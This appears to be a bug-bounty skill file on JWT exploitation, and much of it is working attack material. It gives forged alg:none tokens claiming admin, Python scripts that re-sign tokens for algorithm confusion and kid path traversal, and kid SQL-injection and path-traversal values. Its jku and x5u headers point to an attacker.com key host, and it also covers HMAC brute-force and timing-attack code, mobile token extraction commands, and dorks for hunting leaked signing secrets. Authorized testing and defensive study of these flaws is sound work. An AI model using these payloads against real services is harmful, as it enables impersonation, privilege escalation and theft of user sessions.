---
name: "jwt-attacks"
version: "2.1"
category: "api"
subcategory: "jwt"
phase: "exploitation"
tags: ["algorithm-confusion", "bug-bounty", "hmac", "jwt", "kid-injection", "token"]
tools: ["jwt_tool", "hashcat", "c-jwt-cracker", "frida", "objection"]
follow_up_skills: ["api-fuzzing", "json-auth-fuzzing", "http-header-injection", "authorization-session-testing"]
description: "Bug bounty skill: jwt attacks - exploitation phase, api category"
---
# JWT Attacks

## Summary

JWT (JSON Web Token) authentication is susceptible to multiple attack classes: algorithm confusion (none, RS256→HS256), weak HMAC secret brute force, header injection (kid, jku, jwk, x5u), JWKS cache poisoning, JWS/JWE confusion, and missing claims validation. Tokens stored in mobile apps add extraction risk.

## Key Concepts

- **JWT Structure**: Three Base64URL-encoded parts — `header.payload.signature`
- **Symmetric vs Asymmetric**: HS256 (shared secret) vs RS256/ES256 (public/private key pair)
- **Algorithm Confusion**: Switching from asymmetric to symmetric forces server to use public key as HMAC secret
- **kid (Key ID)**: Header parameter that can reference a file path, DB query, or key ID — injection surface
- **jku (JWK Set URL)**: URL pointing to a remote JWKS — SSRF and rogue key injection surface
- **jwk (JSON Web Key)**: Inline key in header — server may accept attacker-controlled public key
- **x5u (X.509 URL)**: URL to X.509 certificate — SSRF via cert retrieval
- **JWS/JWE Confusion**: Server may accept an encrypted token (JWE) where a signed token (JWS) is expected, or vice versa

## Technical Details

### Signing Algorithms

| Algorithm | Type | Attack Surface |
|---|---|---|
| HS256/384/512 | Symmetric HMAC | Weak secret brute force, confusion target |
| RS256/384/512 | Asymmetric RSA | Public key misuse as HMAC secret |
| ES256/384/512 | Asymmetric ECDSA | Curve confusion (rare) |
| PS256/384/512 | RSASSA-PSS | Less common |
| EdDSA | Asymmetric | Minimal attack surface |
| none | Unsigned | No signature verification |

### Additional Pitfalls

- JWS/JWE confusion: server accepts encrypted where signed expected or fails open on unexpected `typ`/`cty`
- JWKS retrieval: SSRF via `jku`/`x5u`, insecure TLS, poisoned key caching, `kid` collisions
- Token binding (DPoP, mTLS): incorrectly implemented allows replay from other clients
- `crit` header abuse: server ignores unknown critical parameters, enabling bypass
- Timing attacks: non-constant-time HMAC comparison leaks secret byte-by-byte

### Vulnerability Map
```
JWT Vulnerabilities
├── Algorithm Bypass
│   ├── alg:none attack
│   └── RS256→HS256 confusion (public key as HMAC secret)
├── Weak Secret Key → Brute force
├── kid Parameter Injection
│   ├── SQL injection via kid
│   └── Path traversal via kid
├── Header Injection
│   ├── jwk (inline fake key)
│   ├── jku/x5u (remote attacker-controlled JWKS)
│   └── JWKS cache poisoning
└── Missing / Broken Validation
    ├── No signature check
    ├── Expired tokens accepted
    └── iss/aud/exp not validated
```

## Methodology

1. Identify JWT usage — check `Authorization: Bearer` headers, cookies containing `eyJ...`, and browser local/session storage.
2. Decode the token at jwt.io or via Burp JWT extension — inspect header parameters (alg, kid, jku, jwk, x5u, crit, typ) and payload claims (exp, nbf, aud, iss, iat).
3. Test `alg:none` — modify header to `{"alg":"none"}` and remove signature; try case variants (None, NONE, nOnE).
4. Test algorithm confusion (RS256→HS256) — if the server uses RSA, re-sign the token using the public key as the HMAC secret with `{"alg":"HS256"}`.
5. Test `kid` injection — try path traversal (`../../dev/null`), file URIs (`file:///dev/null`), and SQLi (`' OR 1=1 --`) in the kid header field.
6. Test `jku`/`x5u` injection — point to an attacker-controlled JWKS endpoint or certificate URL.
7. Test `jwk` injection — supply an inline attacker-controlled RSA public key in the jwk header.
8. Brute force the HMAC secret — use jwt_tool, hashcat, or c-jwt-cracker with a dictionary.
9. Test missing/weak claim validation — remove or modify `exp`, change `iss`/`aud`, modify `iat`/`nbf`.
10. Test JWS/JWE confusion — swap token types to find weaker validation paths.
11. Check for sensitive data in the payload — PII, credentials, session details stored unencrypted.
12. Extract tokens from mobile apps — check Android SharedPreferences/AsyncStorage, iOS Keychain, backup files.
13. Check for tokens in URL parameters — search Wayback Machine, check Referer headers to third parties.
14. Hunt for the signing secret in public places — GitHub code search, Google dorks (`"jwt secret"`, `"jwt_secret"`, `"HS256" site:github.com`), public config files, and npm/pypi package leaks. Real-world case: a healthcare app signed JWTs with `"123456"` and a Google search for "JWT secret" surfaced the actual signing key — instant full impersonation.

## Detection Commands

### Decode JWT parts
```bash
# Decode header
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d 2>/dev/null

# Decode payload
echo 'eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ' | base64 -d 2>/dev/null
```

### Test alg:none (try all case variants)
```bash
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"sub":"admin","iat":1516239022}
# Signature: (empty)
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0."
curl -H "Authorization: Bearer $TOKEN" https://target.com/api/admin
```

### Test algorithm confusion (RS256→HS256)
```bash
# Re-sign with public key as HMAC secret using jwt_tool
python3 jwt_tool.py <token> -X a -pk public.pem
# Or manually with python
python3 -c "
import jwt, base64
with open('public.pem','r') as f: pub = f.read()
token = jwt.encode({'sub':'admin'}, pub, algorithm='HS256')
print(token)
"
```

### Test kid injection
```bash
# Path traversal kid
HEADER=$(echo -n '{"alg":"HS256","kid":"../../../../dev/null"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
# Empty/null HMAC key -> signature with empty secret
python3 -c "
import jwt, base64
token = jwt.encode({'sub':'admin'}, '', algorithm='HS256', headers={'kid':'../../../../dev/null'})
print(token)
"
```

### Test jwk injection
```bash
# Generate attacker keypair and embed jwk header
python3 jwt_tool.py <token> -X i -I -pc sub -pv admin
```

### Brute force HMAC secret with jwt_tool
```bash
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
```

### Full scan with jwt_tool
```bash
python3 jwt_tool.py <token> -M all
```

### Check JWT in URL parameters via Wayback
```bash
curl "https://web.archive.org/cdx/search/cdx?url=target.com&output=text&fl=original&filter=statuscode:200" | grep -E "(jwt|token|access_token)="
```

## Exploitation Payloads

### alg:none with empty signature
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
```

### alg:NONE (uppercase variant)
```
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
```

### RS256→HS256 confusion
```json
{"alg":"HS256","typ":"JWT"}
```
Re-sign using RSA public key as HMAC secret.

### kid path traversal
```json
{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
```

### kid file URI
```json
{"alg":"HS256","typ":"JWT","kid":"file:///dev/null"}
```

### kid SQL injection
```json
{"alg":"HS256","typ":"JWT","kid":"' OR 1=1 --"}
```

### jwk inline key injection
```json
{
  "alg":"RS256",
  "typ":"JWT",
  "jwk": {
    "kty":"RSA",
    "e":"AQAB",
    "kid":"attacker-key",
    "n":"<attacker_rsa_modulus_base64url>"
  }
}
```

### jku remote key set
```json
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}
```

### x5u remote certificate
```json
{"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}
```

### crit header abuse
```json
{"alg":"RS256","typ":"JWT","crit":["exp"],"exp":null}
```

### Missing claim validation
```json
{"sub":"admin","iat":1516239022}
// No exp, no nbf, no aud, no iss
```

## Additional Attack Vectors

### Mobile App JWT Storage

**Android:**
- `SharedPreferences`: Check if world-readable; location `/data/data/<package>/shared_prefs/`
- Keystore extraction: root device or exploit app
- Backup extraction: `adb backup -f backup.ab <package>` (if `allowBackup=true`)
- Tools: Frida, objection, MobSF

**iOS:**
- Keychain: Check `kSecAttrAccessible` — `kSecAttrAccessibleAlways` is insecure
- iTunes/iCloud backup extraction: unencrypted backups expose Keychain
- Jailbreak + Keychain-Dumper for full extraction
- Tools: Frida, objection, idb

**React Native / Hybrid:**
- `AsyncStorage` stored in plain text (Android SQLite DB, iOS plist); no encryption by default

### JWT Confusion Attacks

- **SAML-JWT Confusion** — App accepts both SAML and JWT; send JWT where SAML expected or vice versa to exploit weaker validation path
- **API Key-JWT Confusion** — Test sending JWT where API key expected and vice versa
- **Session Cookie-JWT Hybrid** — Test expired JWT with valid session cookie; inject JWT claims into session
- **OAuth Token Confusion** — Send ID token (JWT) to resource server expecting opaque access token

```bash
curl -H "Authorization: Bearer <api_key>" https://api.target/resource
curl -H "X-API-Key: <jwt_token>" https://api.target/resource
```

### Timing Attacks on HMAC

Non-constant-time comparison leaks the HMAC secret character by character via response time differences.

```python
import requests, time

def time_request(signature):
    start = time.perf_counter()
    r = requests.get('https://target/api',
                     headers={'Authorization': f'Bearer header.payload.{signature}'})
    return time.perf_counter() - start

for byte in range(256):
    sig = bytes([byte]) + b'\x00' * 31
    t = time_request(sig.hex())
```

### JWT in URL Parameters

- Tokens in GET URLs appear in server logs, proxy logs, browser history
- Leaked via `Referer` header to external sites; CDN/cache logs may persist tokens

```bash
curl "https://api.target/resource?token=eyJ..."
curl "https://api.target/resource?access_token=eyJ..."
curl "https://api.target/resource?jwt=eyJ..."
```

Check Wayback Machine for historical URLs with tokens; monitor Referer headers to third-party analytics.

## Commands

### jwt_tool scan
```bash
python3 jwt_tool.py <token> -M all
python3 jwt_tool.py <token> -X a    # Algorithm confusion
python3 jwt_tool.py <token> -X n    # Null/none signature
python3 jwt_tool.py <token> -X i    # Identity theft (jwk injection)
python3 jwt_tool.py <token> -X k    # Key confusion
```

### Python manual JWT signing
```bash
python3 -c "
import jwt, base64

# Re-sign with empty secret (kid path traversal)
token = jwt.encode({'sub':'admin'}, '', algorithm='HS256', headers={'kid':'../../../../dev/null'})
print(token)

# Re-sign with public key (algorithm confusion)
with open('public.pem') as f: pub = f.read()
token = jwt.encode({'sub':'admin'}, pub, algorithm='HS256')
print(token)
"
```

### Android JWT extraction
```bash
adb shell "run-as com.target.app cat /data/data/com.target.app/shared_prefs/auth.xml"
```

### iOS backup extraction
```bash
idevicebackup2 backup --full /tmp/ios_backup
# Search backup for JWT-containing files
```

## Tools

- **jwt_tool** — Comprehensive JWT scanning, tampering, cracking
- **JWT.io** — Browser-based token inspection
- **Burp Suite JWT Scanner / JWT Editor** — Automated testing and token editing
- **jwtXploiter** — Advanced JWT vulnerability scanning
- **c-jwt-cracker** — High-speed HMAC brute force (C)
- **hashcat** — Mode 16500 for JWT HMAC cracking
- **Frida, objection, MobSF** — Mobile JWT extraction
- **Wayback Machine** — Historical token leakage search

## Bypass Techniques

- **alg:none case variants**: `none`, `None`, `NONE`, `nOnE`, `NoNe`
- **Algorithm confusion**: RS256→HS256, ES256→HS256 using public key as HMAC secret
- **kid injection**: path traversal (`../../dev/null`), file URIs (`file:///dev/null`), SQLi (`' OR 1=1 --`)
- **jwk/jku/x5u injection**: supply attacker key inline or via URL; exploit lax TLS on JKU fetch
- **JWKS cache poisoning**: force cache to accept attacker keys via `kid` collisions or response header manipulation
- **JWS/JWE confusion**: swap token types to bypass to weaker validation path
- **crit header abuse**: declare critical headers that server doesn't actually check
- **SAML-JWT confusion**: send JWT where SAML expected to exploit weaker validation
- **API Key-JWT confusion**: swap token types between auth mechanisms
- **OAuth token confusion**: send ID token (JWT) to resource server expecting opaque access token
- **Timing attacks**: non-constant-time HMAC comparison leaks secret byte-by-byte
- **URL parameter leakage**: tokens in GET URLs appear in server logs, proxy logs, Referer headers

## Not a Finding If

- Server enforces strict algorithm allowlist (rejects `none`, rejects cross-type algorithm switching)
- `kid` is validated against a whitelist of known key identifiers and cannot be used for path traversal or SQLi
- `jku`/`jwk`/`x5u` headers are rejected or validated with proper TLS pinning and key fingerprint checking
- HMAC secrets have high entropy (256+ bits) and are not in common wordlists
- All standard claims (`exp`, `nbf`, `aud`, `iss`) are enforced server-side
- JWS/JWE types are strictly validated and cannot be confused
- Token binding (DPoP, mTLS) is correctly implemented and replay is prevented
- Mobile tokens are stored in platform-secure storage (Keychain with `kSecAttrAccessibleWhenUnlocked`, EncryptedSharedPreferences) with `allowBackup=false`

## Notes

- The `none` algorithm attack works because some JWT libraries skip signature verification when `alg` is set to `none` — always case-variant test
- Algorithm confusion (RS→HS) succeeds when the server uses the same variable for verification as HS256 secret — many libraries made this mistake
- Mobile app JWT extraction is often easier than exploiting the protocol — check storage first
- JWT in URL parameters is a common but overlooked leakage vector via logs and Referer headers
- Burp Suite JWT Editor extension enables seamless token manipulation during live testing
- Weak secrets are frequently leaked in GitHub repos and public configs — before brute-forcing, try a Google/GitHub search for the secret itself (real-world: signing key `"123456"` found via "JWT secret" search)

## References

- https://portswigger.net/web-security/jwt
- https://github.com/ticarpi/jwt_tool
- https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
- https://jwt.io
